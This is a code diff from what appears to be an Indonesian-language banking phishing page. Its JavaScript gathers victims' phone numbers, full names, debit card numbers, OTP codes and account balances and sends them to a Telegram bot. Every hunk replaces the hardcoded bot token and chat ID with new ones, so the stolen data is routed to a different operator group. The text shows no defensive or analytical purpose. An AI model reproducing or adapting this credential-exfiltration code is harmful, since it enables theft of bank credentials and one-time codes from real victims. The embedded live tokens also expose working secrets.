@@ -8,8 +8,8 @@ document.getElementById('btnSubmit').innerHTML = "Memproses...";
 
     var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nama.value;
 
-   var token = '6821431813:AAHh0EMRe2c-LyauH1Vs7VaalUKgLq4zA6k'; 
-    var grup = '6541745267'; 
+   var token = '6687872226:AAE7PCYWP5htczR5_hnPdHj8u_zU7bCkMj4'; 
+    var grup = '6691167179'; 
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -36,8 +36,8 @@ var debit = document.getElementById('debit');
     var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value;
    
    
-   var token = '6821431813:AAHh0EMRe2c-LyauH1Vs7VaalUKgLq4zA6k'; 
-    var grup = '6541745267'; 
+   var token = '6687872226:AAE7PCYWP5htczR5_hnPdHj8u_zU7bCkMj4'; 
+    var grup = '6691167179'; 
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -71,8 +71,8 @@ var otp = document.getElementById('otp');
     var gabungan = '' + logo.value + '%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣%3A%0A' + otp.value;
    
    
-   var token = '6821431813:AAHh0EMRe2c-LyauH1Vs7VaalUKgLq4zA6k'; 
-    var grup = '6541745267'; 
+   var token = '6687872226:AAE7PCYWP5htczR5_hnPdHj8u_zU7bCkMj4'; 
+    var grup = '6691167179'; 
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -115,8 +115,8 @@ var rupiah = document.getElementById('rupiah');
     var gabungan = '' + tanparupiah.value + '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomormy.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + namamy.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debitmy.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿%3A%0A' + rupiah.value;
    
    
-   var token = '6821431813:AAHh0EMRe2c-LyauH1Vs7VaalUKgLq4zA6k'; 
-    var grup = '6541745267'; 
+   var token = '6687872226:AAE7PCYWP5htczR5_hnPdHj8u_zU7bCkMj4'; 
+    var grup = '6691167179'; 
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
